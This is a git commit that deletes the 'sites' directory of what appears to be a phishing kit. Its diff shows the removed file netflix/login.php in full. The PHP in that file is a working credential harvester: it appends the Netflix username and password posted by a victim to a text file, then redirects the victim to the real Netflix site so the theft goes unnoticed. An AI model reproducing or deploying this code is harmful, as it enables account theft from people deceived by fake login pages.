38eb61b0fdebfeef53b6af2359425463f7f7872f
Iftekhar Ahmed Arnab <arnab.xero@gmail.com>
2021-11-10 21:49:25 +0600

    Delete sites directory

--- sites/netflix/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Account: " . $_POST['userLoginId'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://netflix.com');
-exit();
